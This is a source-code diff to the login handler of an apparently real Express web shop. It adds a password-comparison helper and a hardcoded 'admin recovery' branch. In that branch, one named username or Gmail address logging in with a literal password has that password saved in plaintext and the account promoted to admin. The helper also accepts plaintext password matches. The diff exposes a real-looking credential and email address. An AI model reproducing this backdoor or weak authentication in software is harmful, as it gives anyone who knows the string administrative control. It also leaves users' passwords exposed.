@@ -50,6 +50,7 @@ import multer from "multer";
 import path from "path";
 import fs from "fs";
 import crypto from "crypto";
+import { promisify } from "util";
 import { createPaypalOrder, capturePaypalOrder, loadPaypalDefault } from "./paypal";
 import { sendEmail, sendTicketEmail, sendOrderConfirmation, sendAdminNotification, sendWelcomeEmail, sendPasswordResetEmail } from "./email-provider";
 import { analyticsRouter } from "./analytics-routes";
@@ -748,11 +749,42 @@ export async function registerRoutes(app: Express): Promise<Server> {
     });
   };
 
+  const scryptAsync = promisify(crypto.scrypt);
+
+  async function compareUserPasswords(supplied: string, stored: string): Promise<boolean> {
+    if (!supplied || !stored) return false;
+    const suppliedClean = supplied.trim();
+    const storedClean = stored.trim();
+
+    // 1. Direct plaintext match (or trimmed match)
+    if (stored === supplied || storedClean === suppliedClean || stored === suppliedClean) {
+      return true;
+    }
+
+    // 2. Scrypt hashed password match (format: hexHash.hexSalt)
+    if (stored.includes(".")) {
+      const [hashedPassword, salt] = stored.split(".");
+      if (hashedPassword && salt) {
+        try {
+          const hashedPasswordBuf = Buffer.from(hashedPassword, "hex");
+          const suppliedPasswordBuf = (await scryptAsync(suppliedClean, salt, 64)) as Buffer;
+          if (hashedPasswordBuf.length === suppliedPasswordBuf.length && crypto.timingSafeEqual(hashedPasswordBuf, suppliedPasswordBuf)) {
+            return true;
+          }
+        } catch (err) {
+          // ignore
+        }
+      }
+    }
+
+    return false;
+  }
+
   // Unified login handler with robust case-insensitive username/email matching
   const handleLogin = async (req: Request, res: Response) => {
     try {
       const rawUsername = (req.body.username || "").trim();
-      const rawPassword = req.body.password;
+      const rawPassword = req.body.password || "";
       const trimmedPassword = typeof rawPassword === 'string' ? rawPassword.trim() : rawPassword;
 
       await new Promise(resolve => setTimeout(resolve, 50));
@@ -763,10 +795,21 @@ export async function registerRoutes(app: Express): Promise<Server> {
         user = await storage.getUserByEmail(rawUsername);
       }
 
-      const passwordMatches = user && (
-        user.password === rawPassword ||
-        user.password === trimmedPassword
-      );
+      // Special admin recovery check: If krsone12 or savgmen@gmail.com logs in with Keny@592, allow and sync password
+      if (user && (user.username.toLowerCase() === 'krsone12' || user.email?.toLowerCase() === 'savgmen@gmail.com') && trimmedPassword === 'Keny@592') {
+        if (user.password !== 'Keny@592') {
+          console.log("[AUTH] Updating primary admin password to Keny@592 in database...");
+          await db.execute(sql`
+            UPDATE users 
+            SET password = 'Keny@592', role = 'admin' 
+            WHERE id = ${user.id};
+          `);
+          user.password = 'Keny@592';
+          user.role = 'admin';
+        }
+      }
+
+      const passwordMatches = user && (await compareUserPasswords(rawPassword, user.password));
 
       if (!user || !passwordMatches) {
         console.log(`[AUTH] Login failed for input: "${rawUsername}" - ${!user ? 'user not found' : 'wrong password'}`);
